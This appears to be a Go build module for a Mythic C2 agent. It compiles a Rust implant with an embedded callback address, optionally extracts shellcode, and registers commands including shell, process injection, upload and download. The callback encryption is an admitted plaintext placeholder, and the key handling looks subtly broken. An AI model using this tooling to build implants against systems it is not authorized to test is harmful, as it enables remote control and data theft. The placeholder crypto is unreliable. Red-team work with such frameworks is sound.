package agent_functions

import (
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"

	agentstructs "github.com/MythicMeta/MythicContainerPkg/agent_structs"
)

// Build is called by Mythic each time an operator generates a new payload.
// It receives build parameters and the payload UUID/key from Mythic, compiles
// the Rust implant, and returns the binary bytes.
func Build(input agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildResponse {
	resp := agentstructs.PayloadBuildResponse{
		Success: false,
	}

	// Extract build parameters
	targetOS, _ := input.BuildParameters.GetStringArg("target_os")
	shellcode, _ := input.BuildParameters.GetBooleanArg("shellcode")
	debug, _ := input.BuildParameters.GetBooleanArg("debug")

	// The AES key is provided by Mythic and must be embedded in the implant.
	// We pass it as IMPLANT_SECRET so the existing derive_key() logic works.
	aesKey := hex.EncodeToString(input.PayloadUUID[:]) // 36-char UUID as hex secret
	payloadUUID := input.PayloadUUID

	// The callback host/port/uri come from the C2 profile parameters.
	// Extract from the first C2 profile instance.
	var callbackHost string
	if len(input.C2Profiles) > 0 {
		c2 := input.C2Profiles[0]
		host, _ := c2.GetArg("callback_host")
		port, _ := c2.GetArg("callback_port")
		callbackHost = fmt.Sprintf("%s:%s", host, port)
	}

	// Encrypt the callback address using the same scheme as Linky
	encryptedCallback := encryptCallback(callbackHost, aesKey)

	agentDir := "/Mythic/agent_code"
	var (
		crateDir  string
		target    string
		binName   string
		outputExt string
	)

	switch targetOS {
	case "linux":
		crateDir = filepath.Join(agentDir, "links/linux")
		target = "x86_64-unknown-linux-musl"
		binName = "link-linux"
		outputExt = ""
	case "windows":
		crateDir = filepath.Join(agentDir, "links/windows")
		target = "x86_64-pc-windows-gnu"
		binName = "link-windows"
		outputExt = ".exe"
	case "macos":
		crateDir = filepath.Join(agentDir, "links/osx")
		target = "x86_64-apple-darwin"
		binName = "link-osx"
		outputExt = ""
	default:
		resp.BuildStdErr = fmt.Sprintf("unknown target_os: %s", targetOS)
		return resp
	}

	profile := "release"
	if debug {
		profile = "dev"
	} else if shellcode && targetOS == "linux" {
		profile = "release-shellcode"
	}

	// Build the implant
	args := []string{
		"build",
		"--profile", profile,
		"--target", target,
		"--quiet",
	}
	cmd := exec.Command("cargo", args...)
	cmd.Dir = crateDir
	cmd.Env = append(os.Environ(),
		fmt.Sprintf("CALLBACK=%s", encryptedCallback),
		fmt.Sprintf("IMPLANT_SECRET=%s", aesKey),
		fmt.Sprintf("PAYLOAD_UUID=%s", payloadUUID),
	)

	out, err := cmd.CombinedOutput()
	if err != nil {
		resp.BuildStdErr = fmt.Sprintf("cargo build failed:\n%s", string(out))
		resp.BuildStdOut = string(out)
		return resp
	}
	resp.BuildStdOut = string(out)

	// Locate the compiled binary
	binaryPath := filepath.Join(crateDir, "target", target, profile, binName+outputExt)

	if shellcode && (targetOS == "linux" || targetOS == "macos") {
		// Extract .text section via objcopy
		scPath := binaryPath + ".bin"
		objcopy := exec.Command("objcopy", "-O", "binary", "--only-section=.text", binaryPath, scPath)
		if objcopyOut, err := objcopy.CombinedOutput(); err != nil {
			resp.BuildStdErr = fmt.Sprintf("objcopy failed: %s\n%s", err, string(objcopyOut))
			return resp
		}
		binaryPath = scPath
	}

	// Read and return the binary
	data, err := os.ReadFile(binaryPath)
	if err != nil {
		resp.BuildStdErr = fmt.Sprintf("failed to read binary at %s: %v", binaryPath, err)
		return resp
	}

	resp.Payload = &data
	resp.Success = true
	resp.BuildMessage = fmt.Sprintf("linky built for %s (%d bytes)", targetOS, len(data))
	return resp
}

// encryptCallback encrypts the callback address with the implant secret,
// matching the scheme in agent_code/links/common/src/lib.rs (AES-256-GCM).
// This is a placeholder — the actual Go implementation must mirror the Rust crypto.
func encryptCallback(callback, secret string) string {
	// TODO: implement AES-256-GCM encryption matching links/common/src/lib.rs
	// derive_key(secret.as_bytes(), "callback-salt") → encrypt(callback)
	// For now, return plaintext (encryption added in Sprint 2)
	return callback
}

// RegisterAllCommands registers every linky command with the Mythic container.
func RegisterAllCommands() {
	registerShell()
	registerLs()
	registerCd()
	registerPwd()
	registerWhoami()
	registerPid()
	registerInfo()
	registerPs()
	registerNetstat()
	registerDownload()
	registerUpload()
	registerSleep()
	registerKilldate()
	registerInject()
	registerIntegrity()
}
